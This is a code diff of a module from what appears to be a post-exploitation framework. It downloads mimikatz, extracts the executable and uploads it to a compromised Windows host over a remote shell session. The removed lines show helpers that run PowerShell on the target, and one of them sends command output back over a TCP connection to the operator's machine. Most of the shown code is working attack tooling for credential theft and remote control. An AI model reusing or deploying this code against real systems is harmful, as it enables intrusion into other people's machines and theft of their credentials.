@@ -1,17 +1,13 @@
 from __future__ import annotations
 
-import re
 import select
 import tempfile
 import time
 import urllib.request
-import uuid
 import zipfile
 
 from koi.modules.blueprint import KoiModule
-from koi.utils.tcp import get_local_ip, spawn_send_server, spawn_recv_server
-
-_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')
+from koi.utils.tcp import get_local_ip, spawn_send_server
 
 MIMIKATZ_ZIP_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
 
@@ -38,70 +34,6 @@ class PopulateWinModule(KoiModule):
         },
     ]
 
-    def _win_query(self, ps_expr: str, timeout: float = 60.0) -> str:
-        """
-        Run a PowerShell expression on the remote target and return its output.
-        Handles both plain and upgraded (ConPtyShell) sessions.
-        """
-        if self.session.upgraded:
-            return self._win_query_sidechannel(ps_expr, timeout)
-
-        sentinel = uuid.uuid4().hex
-        marker   = f"__KOI_{sentinel}__"
-
-        if self.session.os_type == "windows_ps":
-            cmd = f"({ps_expr}); '{marker}'"
-        else:
-            inner = f"({ps_expr}); '{marker}'"
-            cmd   = f'powershell -NoProfile -NonInteractive -c "{inner}"'
-
-        eol = self.session.eol
-        enc = self.session.encoding
-        self.session.conn.sendall((cmd + eol).encode(enc))
-
-        buf      = b""
-        deadline = time.monotonic() + timeout
-        lines: list[str] = []
-
-        while True:
-            remaining = deadline - time.monotonic()
-            if remaining <= 0:
-                break
-            r, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
-            if not r:
-                continue
-            chunk = self.session.conn.recv(4096)
-            if not chunk:
-                break
-            buf += chunk
-            while b"\n" in buf:
-                raw, buf = buf.split(b"\n", 1)
-                text = raw.decode(enc, errors="replace").strip("\r\n ")
-                text = _PS_PROMPT.sub("", text).strip()
-                if not text or "Write-Host" in text:
-                    continue
-                if marker in text:
-                    return lines[-1] if lines else ""
-                lines.append(text)
-
-        return lines[-1] if lines else ""
-
-    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 60.0) -> str:
-        """Variant for upgraded (ConPtyShell) sessions — result returned via side TCP socket."""
-        local_ip = get_local_ip(self.session.addr[0])
-        port, collect = spawn_recv_server(timeout=timeout)
-
-        ps_cmd = (
-            f"$_r=({ps_expr})|Out-String;"
-            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
-            f"$_s=$_c.GetStream();"
-            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
-            f"$_s.Write($_b,0,$_b.Length);"
-            f"$_s.Flush();$_c.Close()"
-        )
-        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
-        return collect().decode("utf-8", errors="replace").strip()
-
     def _fetch_url(self, url: str) -> bytes:
         """Download *url* locally and return its raw bytes."""
         with urllib.request.urlopen(url, timeout=30) as resp:
@@ -109,6 +41,7 @@ class PopulateWinModule(KoiModule):
 
     def _fetch_mimikatz_exe(self) -> bytes:
         """Download mimikatz_trunk.zip locally and return the x64/mimikatz.exe bytes."""
+        import os
         with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
             tmp_path = tmp.name
         try:
@@ -116,7 +49,6 @@ class PopulateWinModule(KoiModule):
             with zipfile.ZipFile(tmp_path) as zf:
                 return zf.read("x64/mimikatz.exe")
         finally:
-            import os
             os.unlink(tmp_path)
 
     def _upload_exe(self, raw: bytes, dest: str) -> bool:
